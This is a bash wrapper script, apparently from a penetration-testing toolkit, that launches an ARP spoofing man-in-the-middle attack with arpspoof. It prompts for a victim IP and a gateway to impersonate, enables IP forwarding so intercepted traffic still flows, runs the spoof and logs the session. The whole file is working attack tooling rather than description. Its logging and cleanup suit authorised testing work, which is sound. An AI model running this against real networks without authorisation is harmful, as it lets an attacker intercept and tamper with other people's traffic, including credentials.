#!/bin/bash

# Wrapper script for arpspoof

LOG_FILE="./toolkit.log" # Relative to project root where pen_test_toolkit.zsh is
log_message() {
    # Ensure log file exists and is writable, though primary responsibility is on main script
    # touch "$LOG_FILE" 2>/dev/null 
    echo "$(date '+%Y-%m-%d %H:%M:%S') - [run_arpspoof] - $1" >> "$LOG_FILE"
}

echo "--- ARP Spoofing (arpspoof) ---"
log_message "Starting arpspoof wrapper script."

# 1. Root Check
if [[ $EUID -ne 0 ]]; then
    echo "ERROR: This script must be run as root (or with sudo)."
    log_message "Root check FAILED. EUID=$EUID."
    exit 1
fi
log_message "Root check PASSED."

# 2. Tool Check
if ! command -v arpspoof &> /dev/null; then
    echo "ERROR: arpspoof is not installed."
    echo "Please install it (e.g., 'sudo apt install dsniff' or your distro's equivalent)."
    log_message "ERROR: arpspoof not found. Advised user to install dsniff."
    exit 1
fi
echo "arpspoof found."
log_message "arpspoof found on system."

# 3. Gather Parameters
read -p "Enter the network interface (e.g., eth0): " interface
if [ -z "$interface" ]; then
    echo "ERROR: No interface provided. Exiting."
    log_message "ERROR: User did not provide an interface name."
    exit 1
fi
log_message "User provided interface: $interface"

read -p "Enter the target IP address (victim): " target_ip
if [ -z "$target_ip" ]; then
    echo "ERROR: No target IP address provided. Exiting."
    log_message "ERROR: User did not provide a target IP."
    exit 1
fi
log_message "User provided target IP: $target_ip"

read -p "Enter the gateway IP address (or other host to impersonate): " gateway_ip
if [ -z "$gateway_ip" ]; then
    echo "ERROR: No gateway IP address provided. Exiting."
    log_message "ERROR: User did not provide a gateway IP."
    exit 1
fi
log_message "User provided gateway IP: $gateway_ip"

# 4. IP Forwarding Management
echo ""
echo "INFO: For a successful Man-in-the-Middle (MitM) attack, IP forwarding must be enabled on this machine."
log_message "Informed user about IP forwarding requirement."

original_ip_forward_status=$(cat /proc/sys/net/ipv4/ip_forward)
log_message "Original IP forwarding status: $original_ip_forward_status"

ip_forwarding_managed_by_script=0

if [[ "$original_ip_forward_status" == "0" ]]; then
    read -p "IP forwarding is currently disabled. Attempt to enable it? (yes/no): " enable_ip_forward
    if [[ "$enable_ip_forward" == "yes" ]]; then
        echo "Attempting to enable IP forwarding..."
        log_message "User opted to enable IP forwarding."
        if echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null; then
        # Or: sudo sysctl net.ipv4.ip_forward=1
            echo "IP forwarding enabled."
            log_message "IP forwarding enabled successfully."
            ip_forwarding_managed_by_script=1
        else
            echo "ERROR: Failed to enable IP forwarding. Please enable it manually if you wish to proceed with MitM."
            log_message "ERROR: Failed to enable IP forwarding."
            # Decide if we should exit or continue. For now, continue but warn.
        fi
    else
        echo "IP forwarding not enabled by script. Ensure it's enabled manually for MitM."
        log_message "User declined automatic IP forwarding."
    fi
else
    echo "IP forwarding is already enabled."
    log_message "IP forwarding was already enabled."
fi
echo ""

# Create output directory if it doesn't exist
mkdir -p "./output"
log_message "Ensured ./output directory exists."

# Generate unique record filename
record_filename="run_arpspoof_$(date +%Y%m%d-%H%M%S)_${interface//[^a-zA-Z0-9_]/}_${target_ip//[^a-zA-Z0-9_]/}.log"
record_filepath="./output/$record_filename"

# 5. Execution
echo "Starting arpspoof..."
echo "Target: $target_ip, Gateway: $gateway_ip, Interface: $interface."
echo "A record of this operation will be saved to: $record_filepath"
echo "Press Ctrl+C in this terminal to stop arpspoof."
log_message "Arpspoof initiated. Target: $target_ip, Gateway: $gateway_ip, Iface: $interface. Record: $record_filepath"

# Write initial record
{
    echo "ARP Spoofing Session Record"
    echo "Start Time: $(date)"
    echo "Interface: $interface"
    echo "Target IP: $target_ip"
    echo "Gateway IP: $gateway_ip"
    echo "IP Forwarding Status at Start: $original_ip_forward_status"
    echo "IP Forwarding Managed by Script this session: $ip_forwarding_managed_by_script (1=yes, 0=no)"
    echo "---"
    echo "Executing: sudo arpspoof -i $interface -t $target_ip $gateway_ip"
} > "$record_filepath"


# Trap Ctrl+C to handle IP forwarding disable and record update
trap 'echo ""; echo "arpspoof interrupted."; log_message "arpspoof interrupted by user (SIGINT)."; current_ip_forward_status_trap=$(cat /proc/sys/net/ipv4/ip_forward); { echo "---"; echo "ARP Spoofing Interrupted by User (Ctrl+C) at: $(date)"; echo "IP Forwarding Status at Interrupt: $current_ip_forward_status_trap"; } >> "$record_filepath"; if [[ "$ip_forwarding_managed_by_script" -eq 1 ]]; then echo "Attempting to disable IP forwarding..."; if echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null; then echo "IP forwarding disabled."; log_message "IP forwarding disabled by script trap."; { echo "IP Forwarding disabled by script trap."; } >> "$record_filepath"; else echo "ERROR: Failed to disable IP forwarding. Please check manually."; log_message "ERROR: Failed to disable IP forwarding via trap."; { echo "ERROR: Failed to disable IP forwarding via trap."; } >> "$record_filepath"; fi; fi; exit 130' INT

# Arpspoof sends its output to stdout, which will be visible on the user's terminal.
# We are not capturing its continuous output, just making a record of the operation.
sudo arpspoof -i "$interface" -t "$target_ip" "$gateway_ip"
ARPSPOOF_EXIT_CODE=$?

log_message "arpspoof command finished with exit code $ARPSPOOF_EXIT_CODE."

# Cleanup after arpspoof finishes (e.g., if it exits due to error or normally, though it usually runs until Ctrl+C)
# This part might not be reached if arpspoof only stops via Ctrl+C
current_ip_forward_status_end=$(cat /proc/sys/net/ipv4/ip_forward)
if [[ "$ip_forwarding_managed_by_script" -eq 1 ]]; then
    echo "Attempting to disable IP forwarding as arpspoof has ended..."
    if echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null; then
        echo "IP forwarding disabled."
        log_message "IP forwarding disabled by script post-execution."
        current_ip_forward_status_end="0 (disabled by script)"
    else
        echo "ERROR: Failed to disable IP forwarding. Please check manually: /proc/sys/net/ipv4/ip_forward"
        log_message "ERROR: Failed to disable IP forwarding post-execution."
        current_ip_forward_status_end="1 (failed to disable by script)"
    fi
fi

# Append final status to record
{
    echo "---"
    echo "End Time: $(date)"
    echo "Arpspoof Exit Code: $ARPSPOOF_EXIT_CODE"
    echo "IP Forwarding Status at Exit: $current_ip_forward_status_end"
} >> "$record_filepath"

# Clear the trap
trap - INT

echo "ARP spoofing session ended. Operation record updated in: $record_filepath"
log_message "arpspoof wrapper script finished. Record: $record_filepath"
exit $ARPSPOOF_EXIT_CODE
